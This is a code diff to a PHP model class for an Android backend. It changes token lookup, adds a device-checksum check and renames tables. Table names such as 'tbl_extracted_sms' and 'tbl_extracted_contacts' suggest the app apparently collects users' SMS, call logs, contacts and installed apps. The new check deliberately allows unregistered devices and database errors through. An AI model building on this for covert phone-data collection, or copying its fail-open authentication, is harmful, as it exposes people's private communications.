@@ -15,16 +15,10 @@ class Mod_Android extends Model
     public function token_test(string $token)
     {
         try {
-//            $builder = $this->db->table('tbl_tokens');
-//            $result = $builder->where('token', $token)
-//                ->where('status', "00")
-//                ->limit(1)
-//                ->get()
-//                ->getRowArray();
-            $builder = $this->db->table('tbl_tokens');
+            $builder = $this->db->table('tbl_user_api_tokens');
             $result = $builder->where('token', $token)
-                ->where('created_at = last_used_at', NULL, FALSE)  // Assumes initial last_used_at equals created_at for unused tokens
-                ->where('expires_at > NOW()', NULL, FALSE)  // Checks if token has not expired (expires_at after current timestamp)
+                ->where('created_at = last_used_at', NULL, FALSE)
+                ->where('expires_at > NOW()', NULL, FALSE)
                 ->limit(1)
                 ->get()
                 ->getRowArray();
@@ -39,6 +33,54 @@ class Mod_Android extends Model
         } catch (\Exception $e) {
             log_message('error', 'Token test failed: ' . $e->getMessage());
             return false;
+        }
+    }
+
+    /**
+     * Cross-checks X-Device-UUID + X-Device-Checksum against tbl_device_profiles.
+     *
+     * Returns true  → device is known and checksum matches → allow request.
+     * Returns false → checksum mismatch, unknown device, or spoofed UUID → block request.
+     * Returns null  → device not yet registered (fingerprint endpoint hasn't run yet) → allow through.
+     *
+     * @param int    $ownerId  Token owner ID resolved from tbl_user_api_tokens
+     * @param string $uuid     X-Device-UUID header  (ANDROID_ID)
+     * @param string $checksum X-Device-Checksum header  (SHA256(UUID+MODEL+salt))
+     * @return bool|null
+     */
+    public function verify_device_checksum(int $ownerId, string $uuid, string $checksum)
+    {
+        try {
+            // Look up any registered device for this owner with this android_id
+            $device = $this->db->table('tbl_device_profiles')
+                ->select('device_id, android_id')
+                ->where('owner_id', $ownerId)
+                ->where('android_id', $uuid)
+                ->limit(1)
+                ->get()
+                ->getRowArray();
+
+            if (!$device) {
+                // Device UUID not in DB yet — fingerprint hasn't been submitted yet
+                // Return null to signal "unregistered, allow through"
+                return null;
+            }
+
+            // Device exists — compare stored checksum (device_id column) against header
+            $storedChecksum = $device['device_id'] ?? '';
+            $matches = hash_equals($storedChecksum, $checksum);
+
+            if (!$matches) {
+                log_message('warning', "Checksum mismatch for owner #{$ownerId} uuid={$uuid}: " .
+                    "sent={$checksum} stored={$storedChecksum}");
+            }
+
+            return $matches;
+
+        } catch (\Exception $e) {
+            log_message('error', 'verify_device_checksum failed: ' . $e->getMessage());
+            // On DB error, fail open (allow) to avoid locking out legitimate devices
+            return null;
         }
     }
 
@@ -61,7 +103,7 @@ class Mod_Android extends Model
                 'created_at' => $date,
             ];
 
-            $builder = $this->db->table('tbl_interactions');
+            $builder = $this->db->table('tbl_user_interactions');
             if ($builder->insert($data)) {
                 log_message('info', 'Action registered: ' . $action . ' for user ' . $user_id);
                 return true;
@@ -100,10 +142,10 @@ class Mod_Android extends Model
         }
     }
 
-    public function data_del_apps(int $user_id): bool { return $this->data_delete_by_user('tbl_apps', $user_id); }
-    public function data_del_call_logs(int $user_id): bool { return $this->data_delete_by_user('tbl_logs', $user_id); }
-    public function data_del_contacts(int $user_id): bool { return $this->data_delete_by_user('tbl_contacts', $user_id); }
-    public function data_del_sms(int $user_id): bool { return $this->data_delete_by_user('tbl_sms', $user_id); }
+    public function data_del_apps(int $user_id): bool { return $this->data_delete_by_user('tbl_extracted_installed_apps', $user_id); }
+    public function data_del_call_logs(int $user_id): bool { return $this->data_delete_by_user('tbl_extracted_call_logs', $user_id); }
+    public function data_del_contacts(int $user_id): bool { return $this->data_delete_by_user('tbl_extracted_contacts', $user_id); }
+    public function data_del_sms(int $user_id): bool { return $this->data_delete_by_user('tbl_extracted_sms', $user_id); }
 
     /**
      * Normalizes phone number length.
